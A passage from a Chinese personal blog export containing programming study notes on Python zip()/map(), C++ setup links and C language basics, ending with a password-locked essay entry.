<p>如果各个迭代器的元素个数不一致，则返回列表长度与最短的对象相同，利用 * 号操作符，可以将元组解压为列表。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;a &#x3D; [1,2,3]</span><br><span class="line">&gt;&gt;&gt; b &#x3D; [4,5,6]</span><br><span class="line">&gt;&gt;&gt; c &#x3D; [4,5,6,7,8]</span><br><span class="line">&gt;&gt;&gt; zipped &#x3D; zip(a,b)     # 打包为元组的列表</span><br><span class="line">[(1, 4), (2, 5), (3, 6)]</span><br><span class="line">&gt;&gt;&gt; zip(a,c)              # 元素个数与最短的列表一致</span><br><span class="line">[(1, 4), (2, 5), (3, 6)]</span><br><span class="line">&gt;&gt;&gt; zip(*zipped)          # 与 zip 相反，*zipped 可理解为解压，返回二维矩阵式</span><br><span class="line">[(1, 2, 3), (4, 5, 6)]</span><br></pre></td></tr></table></figure>

<h2 id="map-函数：list转换器"><a href="#map-函数：list转换器" class="headerlink" title="map() 函数：list转换器"></a>map() 函数：list转换器</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">map()是 Python 内置的高阶函数，它接收一个函数 f 和一个 list，并通过把函数 f 依次作用在 list 的每个元素上，得到一个新的 list 并返回。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果函数是 None，自动假定一个‘identity’函数,这时候就是模仿 zip()函数，</span><br><span class="line">l&#x3D;[1,2,3]</span><br><span class="line">x&#x3D;map(None,l)</span><br><span class="line">print(x)</span><br><span class="line">这时候 None 类型不是一个可以调用的对象。所以他没法返回值。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-07-22-learn-CPP</title>
    <url>/2020/07/22/2020-07-22-learn-CPP/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/bat67/article/details/76095813" target="_blank" rel="noopener">VScode C/C++环境配置</a></p>
<p><a href="https://blog.csdn.net/ysz171360154/article/details/84572114" target="_blank" rel="noopener">CodeBlocks 安装</a></p>
]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>c语言基础复习</title>
    <url>/2020/07/21/2020-07-21-C-Program/</url>
    <content><![CDATA[<p><a href="https://github.com/yaouser/C" target="_blank" rel="noopener">如何阅读内核代码</a></p>
<p>简单的基础复习</p>
<p>C语言：数组、函数、指针、内存对齐模式、大小端问题、野指针、内存泄露、static、register、define、typedef、struct、union 等一些关键字的考察。</p>
<h1 id="容易忘的基本语法"><a href="#容易忘的基本语法" class="headerlink" title="容易忘的基本语法"></a>容易忘的基本语法</h1><p><a href="https://github.com/Y-Dian/LearnXinYminutes/blob/master/learnc-cn.c#L179" target="_blank" rel="noopener">基本语法一览</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 常数： #define 关键词</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DAYS_IN_YEAR 365</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 以枚举的方式定义常数</span></span><br><span class="line"><span class="keyword">enum</span> days &#123;SUN = <span class="number">1</span>, MON, TUE, WED, THU, FRI, SAT&#125;;</span><br><span class="line"><span class="comment">// MON自动被定义为2，TUE被定义为3，以此类推。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// include &lt;尖括号&gt;间的文件名是C标准库的头文件。</span></span><br><span class="line"><span class="comment">// 标准库以外的头文件，使用双引号代替尖括号。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"my_header.h"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你的程序的入口是一个返回值为整型的main函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;&#125;</span><br><span class="line"><span class="comment">//argc参数表示了命令行中参数 的个数(注意：文件名本身也算一个参数)</span></span><br><span class="line"><span class="comment">// argv参数是字符串指针数组， 其各元素值为命令行中各字符串 (参数均按字符串处理)的首地址。指针数组的长度即为参数个数。数组元素初值由系统自动赋予。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// char类型一定会占用1个字节，但是其他的类型却会因具体机器的不同而各异</span></span><br><span class="line"><span class="keyword">int</span> x_int = <span class="number">0</span>;<span class="comment">// int型（整型）变量一般占用4个字节</span></span><br><span class="line">short x_short = <span class="number">0</span>;<span class="comment">// short型（短整型）变量一般占用2个字节</span></span><br><span class="line"><span class="keyword">char</span> x_char = <span class="number">0</span>;<span class="comment">// char型（字符型）变量会占用1个字节</span></span><br><span class="line"><span class="keyword">char</span> y_char = <span class="string">'y'</span>; <span class="comment">// 字符变量的字面值需要用单引号包住</span></span><br><span class="line"><span class="keyword">long</span> x_long = <span class="number">0</span>;<span class="comment">// long型（长整型）一般需要4个字节到8个字节; </span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> x_long_long = <span class="number">0</span>; <span class="comment">//而long long型则至少需要8个字节（64位）</span></span><br><span class="line"><span class="keyword">float</span> x_float = <span class="number">0.0</span>;<span class="comment">// float一般是用32位表示的浮点数字</span></span><br><span class="line"><span class="keyword">double</span> x_double = <span class="number">0.0</span>;<span class="comment">// double一般是用64位表示的浮点数字</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 整数类型也可以有无符号的类型表示。这样这些变量就无法表示负数</span></span><br><span class="line"><span class="comment">// 但是无符号整数所能表示的范围就可以比原来的整数大一些</span></span><br><span class="line"><span class="keyword">unsigned</span> short ux_short;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ux_int;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ux_long_long;</span><br><span class="line"></span><br><span class="line"><span class="comment">// size_t是一个无符号整型，表示对象的尺寸，至少2个字节</span></span><br><span class="line"><span class="keyword">size_t</span> <span class="built_in">size</span> = <span class="keyword">sizeof</span>(a++); <span class="comment">// a++ 不会被演算,siezeof直接算a的size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组必须要被初始化为具体的长度</span></span><br><span class="line"><span class="comment">// 可以用下面的方法把数组初始化为0:</span></span><br><span class="line"><span class="keyword">char</span> my_array[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">// 多维数组</span></span><br><span class="line"><span class="keyword">int</span> multi_array[<span class="number">2</span>][<span class="number">5</span>] = &#123;</span><br><span class="line">        &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;,</span><br><span class="line">        &#123;<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">0</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 获取元素</span></span><br><span class="line"><span class="keyword">int</span> array_int = multi_array[<span class="number">0</span>][<span class="number">2</span>]; <span class="comment">// =&gt; 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串就是以 NUL (0x00) 这个字符结尾的字符数组,</span></span><br><span class="line"><span class="comment">// NUL可以用'\0'来表示.</span></span><br><span class="line"><span class="comment">// (在字符串字面量中我们不必输入这个字符，编译器会自动添加的)</span></span><br><span class="line"><span class="keyword">char</span> a_string[<span class="number">20</span>] = <span class="string">"This is a string"</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>, a_string); <span class="comment">// %s 可以对字符串进行格式化</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">也许你会注意到 a_string 实际上只有16个字节长.</span></span><br><span class="line"><span class="comment">第17个字节是一个空字符(NUL) </span></span><br><span class="line"><span class="comment">而第18, 19 和 20 个字符的值是未定义。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 字符串增、减</span></span><br><span class="line"><span class="keyword">char</span> *s = <span class="string">"iLoveC"</span></span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">s[j++]; <span class="comment">// "i" 返回s的第j项，然后增加j的值。</span></span><br></pre></td></tr></table></figure>

<h2 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">///////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 操作符</span></span><br><span class="line"><span class="comment">///////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// C中没有布尔类型，而是用整形替代</span></span><br><span class="line"><span class="comment">// (C99中有_Bool或bool。)</span></span><br><span class="line"><span class="comment">// 0为假, 其他均为真. (比较操作符的返回值总是返回0或1)</span></span><br><span class="line"><span class="number">3</span> == <span class="number">2</span>; <span class="comment">// =&gt; 0 (false)</span></span><br><span class="line"><span class="number">3</span> != <span class="number">2</span>; <span class="comment">// =&gt; 1 (true)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// C不是Python —— 连续比较不合法</span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> between_0_and_2 = <span class="number">0</span> &lt; a &lt; <span class="number">2</span>;<span class="comment">// 错误</span></span><br><span class="line"><span class="keyword">int</span> between_0_and_2 = <span class="number">0</span> &lt; a &amp;&amp; a &lt; <span class="number">2</span>;<span class="comment">// 正确</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑运算符适用于整数</span></span><br><span class="line">!<span class="number">3</span>; <span class="comment">// =&gt; 0 (非)</span></span><br><span class="line">!<span class="number">0</span>; <span class="comment">// =&gt; 1</span></span><br><span class="line"><span class="number">1</span> &amp;&amp; <span class="number">1</span>; <span class="comment">// =&gt; 1 (且)</span></span><br><span class="line"><span class="number">0</span> &amp;&amp; <span class="number">1</span>; <span class="comment">// =&gt; 0</span></span><br><span class="line"><span class="number">0</span> || <span class="number">1</span>; <span class="comment">// =&gt; 1 (或)</span></span><br><span class="line"><span class="number">0</span> || <span class="number">0</span>; <span class="comment">// =&gt; 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 三元式、条件表达式 （ ? : ）</span></span><br><span class="line">z = (a &gt; b) ? a : b; <span class="comment">//  10 “若a &gt; b返回a，否则返回b。”</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 位运算</span></span><br><span class="line">~<span class="number">0x0F</span>; <span class="comment">// =&gt; 0xF0 (取反)</span></span><br><span class="line"><span class="number">0x0F</span> &amp; <span class="number">0xF0</span>; <span class="comment">// =&gt; 0x00 (和)</span></span><br><span class="line"><span class="number">0x0F</span> | <span class="number">0xF0</span>; <span class="comment">// =&gt; 0xFF (或)</span></span><br><span class="line"><span class="number">0x04</span> ^ <span class="number">0x0F</span>; <span class="comment">// =&gt; 0x0B (异或)</span></span><br><span class="line"><span class="number">0x01</span> &lt;&lt; <span class="number">1</span>; <span class="comment">// =&gt; 0x02 (左移1位)</span></span><br><span class="line"><span class="number">0x02</span> &gt;&gt; <span class="number">1</span>; <span class="comment">// =&gt; 0x01 (右移1位)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对有符号整数进行移位操作要小心 —— 以下未定义：</span></span><br><span class="line"><span class="comment">// 有符号整数位移至符号位 int a = 1 &lt;&lt; 32</span></span><br><span class="line"><span class="comment">// 左移位一个负数 int a = -1 &lt;&lt; 2</span></span><br><span class="line"><span class="comment">// 移位超过或等于该类型数值的长度</span></span><br><span class="line"><span class="comment">// int a = 1 &lt;&lt; 32; // 假定int32位</span></span><br></pre></td></tr></table></figure>

<h2 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">///////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 控制结构</span></span><br><span class="line"><span class="comment">///////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// if()&#123;&#125;</span></span><br><span class="line"><span class="comment">// else if()&#123;&#125;</span></span><br><span class="line"><span class="comment">// else&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// While循环</span></span><br><span class="line"><span class="comment">// while()&#123;&#125;</span></span><br><span class="line"><span class="comment">// do&#123;&#125;while()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt;= 5; i++) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多重分支：switch()</span></span><br><span class="line"><span class="keyword">switch</span> (some_integral_expression) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// 标签必须是整数常量表达式</span></span><br><span class="line">    do_stuff();</span><br><span class="line">    <span class="keyword">break</span>; <span class="comment">// 如果不使用break，控制结构会继续执行下面的标签</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    do_something_else();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="comment">// 假设 `some_integral_expression` 不匹配任何标签</span></span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">"error!\n"</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> x_hex = <span class="number">0x01</span>; <span class="comment">// 可以用16进制字面量赋值</span></span><br><span class="line"><span class="comment">// 整数型和浮点型可以互相转换</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%f\n"</span>, (<span class="keyword">float</span>)<span class="number">100</span>); <span class="comment">// %f 格式化单精度浮点</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lf\n"</span>, (<span class="keyword">double</span>)<span class="number">100</span>); <span class="comment">// %lf 格式化双精度浮点</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, (<span class="keyword">char</span>)<span class="number">100.0</span>);</span><br></pre></td></tr></table></figure>

<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">;-)</span><br><span class="line">;)</span><br><span class="line">:)</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;x); <span class="comment">// 用 &amp; 来获取变量的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针类型在声明中以*开头</span></span><br><span class="line"><span class="keyword">int</span>* px, not_a_pointer; <span class="comment">// px是一个指向int型的指针</span></span><br><span class="line">px = &amp;x; <span class="comment">// 把x的地址保存到px中</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p\n"</span>, (<span class="keyword">void</span> *)px); <span class="comment">// =&gt; 输出内存中的某个地址</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%zu, %zu\n"</span>, <span class="keyword">sizeof</span>(px), <span class="keyword">sizeof</span>(not_a_pointer));</span><br><span class="line"><span class="comment">// =&gt; 在64位系统上打印“8， 4”。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 要得到某个指针指向的内容的值，可以在指针前加一个*来取得（取消引用）</span></span><br><span class="line"><span class="comment">// 注意： 是的，这可能让人困惑，'*'在用来声明一个指针的同时取消引用它。</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, *px); <span class="comment">// =&gt; 输出 0, 即x的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针的增减多少是依据它本身的类型而定的</span></span><br><span class="line"><span class="comment">// （这被称为指针算术）</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, *(x_ptr + <span class="number">1</span>)); <span class="comment">// =&gt; 打印 19</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, x_array[<span class="number">1</span>]); <span class="comment">// =&gt; 打印 19</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你也可以通过标准库函数malloc来实现动态分配</span></span><br><span class="line"><span class="comment">// 这个函数接受一个代表容量的参数，参数类型为`size_t`</span></span><br><span class="line"><span class="comment">// 系统一般会从堆区分配指定容量字节大小的空间</span></span><br><span class="line"><span class="comment">// （在一些系统，例如嵌入式系统中这点不一定成立,C标准对此未置一词。）</span></span><br><span class="line"><span class="keyword">int</span> *my_ptr = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*my_ptr) * <span class="number">20</span>);</span><br><span class="line"><span class="keyword">for</span> (xx=<span class="number">0</span>; xx&lt;<span class="number">20</span>; xx++) &#123;</span><br><span class="line">    *(my_ptr + xx) = <span class="number">20</span> - xx; <span class="comment">// my_ptr[xx] = 20-xx</span></span><br><span class="line">&#125; <span class="comment">// 初始化内存为 20, 19, 18, 17... 2, 1 (类型为int）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// malloc分配的区域需要手动释放</span></span><br><span class="line"><span class="comment">// 否则没人能够再次使用这块内存，直到程序结束为止</span></span><br><span class="line"><span class="built_in">free</span>(my_ptr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串通常是字符数组，但是经常用字符指针表示</span></span><br><span class="line"><span class="comment">// 一个优良的习惯是使用`const char *`来引用一个字符串字面量，</span></span><br><span class="line"><span class="comment">// 因为字符串字面量不应当被修改（即"foo"[0] = 'a'犯了大忌）</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* my_str = <span class="string">"This is my very own string"</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c\n"</span>, *my_str); <span class="comment">// =&gt; 'T'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果字符串是数组，（多半是用字符串字面量初始化的）</span></span><br><span class="line"><span class="comment">// 情况就不一样了，字符串位于可写的内存中</span></span><br><span class="line"><span class="keyword">char</span> foo[] = <span class="string">"foo"</span>;</span><br><span class="line">foo[<span class="number">0</span>] = <span class="string">'a'</span>; <span class="comment">// 这是合法的，foo现在包含"aoo"</span></span><br></pre></td></tr></table></figure>

<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">函数是按值传递的。当调用一个函数的时候，传递给函数的参数</span></span><br><span class="line"><span class="comment">是原有值的拷贝（数组除外）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">可以通过指针来传递引用，这样函数就可以更改值</span></span><br><span class="line"><span class="comment">例子：字符串本身翻转</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型为void的函数没有返回值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">str_reverse</span><span class="params">(<span class="keyword">char</span> *str_in)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">int</span> ii = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> len = <span class="built_in">strlen</span>(str_in); <span class="comment">// `strlen()`` 是C标准库函数</span></span><br><span class="line">    <span class="keyword">for</span>(ii = <span class="number">0</span>; ii &lt; len / <span class="number">2</span>; ii++)&#123;</span><br><span class="line">        tmp = str_in[ii];</span><br><span class="line">        str_in[ii] = str_in[len - ii - <span class="number">1</span>]; <span class="comment">// 从倒数第ii个开始</span></span><br><span class="line">        str_in[len - ii - <span class="number">1</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果引用函数之外的变量，必须使用extern关键字</span></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">int</span> i; <span class="comment">// 使用外部变量 i</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用static确保external变量为源文件私有</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> i = <span class="number">0</span>; <span class="comment">// 其他使用 testFunc()的文件无法访问变量i</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">int</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//**你同样可以声明函数为static**</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 函数指针</span></span><br><span class="line"><span class="comment">///////////////////////////////////////</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">在运行时，函数本身也被存放到某块内存区域当中</span></span><br><span class="line"><span class="comment">函数指针就像其他指针一样（不过是存储一个内存地址） 但却可以被用来直接调用函数,</span></span><br><span class="line"><span class="comment">并且可以四处传递回调函数</span></span><br><span class="line"><span class="comment">但是，定义的语法初看令人有些迷惑</span></span><br><span class="line"><span class="comment">例子：通过指针调用str_reverse</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">str_reverse_through_pointer</span><span class="params">(<span class="keyword">char</span> *str_in)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义一个函数指针 f. </span></span><br><span class="line">    <span class="keyword">void</span> (*f)(<span class="keyword">char</span> *); <span class="comment">// 签名一定要与目标函数相同</span></span><br><span class="line">    f = &amp;str_reverse; <span class="comment">// 将函数的地址在运行时赋给指针</span></span><br><span class="line">    (*f)(str_in); <span class="comment">// 通过指针调用函数</span></span><br><span class="line">    <span class="comment">// f(str_in); // 等价于这种调用方式</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="用户自定义类型和结构"><a href="#用户自定义类型和结构" class="headerlink" title="用户自定义类型和结构"></a>用户自定义类型和结构</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Typedefs可以创建类型别名，不同于define</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> my_type;</span><br><span class="line">my_type my_type_var = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// struct是数据的集合，成员依序分配，按照</span></span><br><span class="line"><span class="comment">// 编写的顺序</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rectangle</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">width</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">height</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 一般而言，以下断言不成立：</span></span><br><span class="line"><span class="comment">// sizeof(struct rectangle) == sizeof(int) + sizeof(int)</span></span><br><span class="line"><span class="comment">//这是因为structure成员之间可能存在潜在的间隙（为了对齐）请看下文介绍</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function_1</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rectangle</span> <span class="title">my_rec</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过 . 来访问结构中的数据</span></span><br><span class="line">    my_rec.<span class="built_in">width</span> = <span class="number">10</span>;</span><br><span class="line">    my_rec.<span class="built_in">height</span> = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 你也可以声明指向结构体的指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rectangle</span> *<span class="title">my_rec_ptr</span> = &amp;<span class="title">my_rec</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过取消引用来改变结构体的成员...</span></span><br><span class="line">    (*my_rec_ptr).<span class="built_in">width</span> = <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 或者用 -&gt; 操作符作为简写提高可读性</span></span><br><span class="line">    my_rec_ptr-&gt;<span class="built_in">height</span> = <span class="number">10</span>; <span class="comment">// Same as (*my_rec_ptr).height = 10;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你也可以用typedef来给一个结构体起一个别名</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">rectangle</span> <span class="title">rect</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">area</span><span class="params">(<span class="built_in">rect</span> r)</span></span>&#123;<span class="comment">//&lt;--非指针传递</span></span><br><span class="line">    <span class="keyword">return</span> r.<span class="built_in">width</span> * r.<span class="built_in">height</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果struct较大，你可以通过指针传递，避免</span></span><br><span class="line"><span class="comment">// 复制整个struct。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">area</span><span class="params">(<span class="keyword">const</span> <span class="built_in">rect</span> *r)</span></span>&#123;<span class="comment">//&lt;--指针传递</span></span><br><span class="line">    <span class="keyword">return</span> r-&gt;<span class="built_in">width</span> * r-&gt;<span class="built_in">height</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<h1 id="内存对齐"><a href="#内存对齐" class="headerlink" title="内存对齐"></a>内存对齐</h1><p>普遍来说</p>
<p>是以几个字节为单位的内存对齐</p>
<p>如微机中8086若从偶地址读8字节，可以一个周期读完，而</p>
<h1 id="空指针-野指针-无类型指针"><a href="#空指针-野指针-无类型指针" class="headerlink" title="空指针 野指针 无类型指针"></a>空指针 野指针 无类型指针</h1><ul>
<li>空指针是被赋值为NULL的指针</li>
<li>野指针是没有被初始化的指针。</li>
<li>无类型指针，是指void定义的指针，没有确定类型，可以转化为其他类型，适用场景更广泛。</li>
</ul>
]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>不要试图说服别人</title>
    <url>/2020/07/14/2020-07-14-essay-1/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。\n Oh, this is an invalid password. Check and try again, please." data-whm="解密内容无法验证，但您仍然可以看看。\n Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="加密文章，需要输入密码访问。</br> Hey, password is required here." /><label>加密文章，需要输入密码访问。</br> Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="b81620ffe08c82dee0cc12316913c12b3cefc56b6a762f1bcf5320a34c3072d1">05748cba185f8d68c3b09211d41671069191298168343145f69ff1cc9195b1e51da7b8017bd532f3b0cdcdfa10e0a761c6644aeed372392304eaa61d6b87d9593b6a0dcc5aa1ebc22df3f8bc7cc039b4cd5057770f12b262da9846871351fbfd068d436ecf9987d999e724fc56ba7a934ee72c1dfed4a0a5b9ec1c303e9b7e32f575fb9ff4c4d5256fda2fb58f5084c6bae1cc594aee50b0be52685a1dc0385c93808c1f56b6eef99063ab525c93d7071cf218ed937cb12327c0fc91fa8c3ce9b3bb668dbd93b5e21638770073d92b1a4c4dc27e6774fcd672955b00f328926eb54ff6744bbe22f3be140224930edcd9a4bc3e5509229df47080e22d8256a459f3766c03ed5d5283c45d2384ee471048b21b56735f4ec567679d1bd3e329912e77d26a2981f1488a317990d5aee4a88d9bc37a8f10d37f2c0afc2024b93b66321799bd5c374f3158a9d17d30023903e1d069591053f01b7c429a7bb3c84cf9aca6cd763db1d58ce37ac9263c1a8a442afefe16e94906012056524317c269bc366d06e989721bc884a1154d83a0e447abb1dc3750eaec45502180b794793d68a72cdbb8702a9dacf7d39f2623b72b63e265f348c9eea13fb332613d0b64d015fc2e959e9416369933ec956150af226b3400dff1eeb7b0988d3f104b9046319d4a6980dd5dbaac257d7be1086645af754144d417eb42ed92b48afa8842a1e92f97b92006adc5a67318b3879ad6c85a29108a567d5044311b4914fcdf78809882530a839998c684d1e369f70dd78baf40210aaceea607c58ed67960720b3e35916f5e8b4986b9a42ad1af5a081f792429526631ec36ee7c3eadce57c49bbcfff3b683655d02180d0d880689746a659f913df14d6f450c2801dfc43cfa44b0f7ae6a70065302da3ef581b8fb5d3cf4141176a1fcbb644b8ed07714e1c817582e0d3f826286f31677891977b61a0a8e0e32145ff8081ba3c32d989bf7d0765e20b4724405c03a3b941ee07da59c032637e1a0c5f4a4cff0c7d74aeb8695c1dcc3b920e06060be625ba064e3a211d649a0ae2c50fe8a90a53eb88f69fb41936aa8e1fa1862b8dac55ce21af7133b91602cec3533cdbe6d74eca33df10f19d15418190615bec757529102ac468d88b8aeb38cc8513e32fce36f8c363b1050e6a6af68c3341176c07c811f7625d7abf6235a260ea0406ebd8521ac6f3916d28fc462e4d2fa02e1395a698fbc8aca52e65ab69621071e4f8e212f27362c462cc258429959c11e8a296f84b269f0e6fe37f6433c492f7ae05b8d8cbf37a9c4250b3f029df4c2e76d7fd51e5fa2e509bb5f328f06aee8d5d9061e048435f61558ea71507b8ee6b07230aaf06f8a0e1d37330374c